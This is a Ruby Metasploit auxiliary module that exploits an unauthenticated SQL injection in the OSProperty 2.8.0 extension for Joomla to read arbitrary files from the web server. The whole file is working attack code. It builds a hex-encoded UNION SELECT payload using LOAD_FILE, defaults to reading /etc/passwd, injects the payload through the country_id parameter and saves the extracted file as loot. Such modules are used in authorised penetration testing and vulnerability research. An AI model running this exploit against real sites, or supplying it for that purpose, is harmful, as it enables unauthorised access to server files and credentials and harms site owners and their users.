##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'
require 'json'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
                      'Name'           => " OS Solution OSProperty 2.8.0 for Joomla! Unauthenticated SQL Injection Arbitrary File Read",
      'Description'    => %q{

      This module exploits an unauthenticated SQL injection in OS Solution OSProperty for Joomla!
      in order to attempt reading an arbitrary file on the web server with the permissions of the
      SQL database user.
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
          ['EDB', '36862'],
          ['URL', 'https://www.exploit-db.com/exploits/36862/']
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 29 2015"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Relative URI of Joomla installation', '/']),
        OptString.new('FILEPATH', [true, 'The file path to read from the server', '/etc/passwd'])
      ], self.class)
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    read_file = "UNION ALL SELECT NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack("H*")[0]})) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]})#"

    res = send_injected_request(read_file)

    if res.nil? or res.body.nil?
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    file = ''
    file = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

    p = store_loot('joomla.file', 'octet/binary-stream', datastore['RHOST'], [file].pack("H*"), datastore['FILEPATH'])
    print_good("File saved to: " + p)
  end

  def send_injected_request(payload)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_osproperty',
        'no_html' => 1,
        'tmpl' => 'component',
        'task' => 'ajax_loadStateInListPage',
        'country_id' => "1' " + payload
      }
    })
  end
end
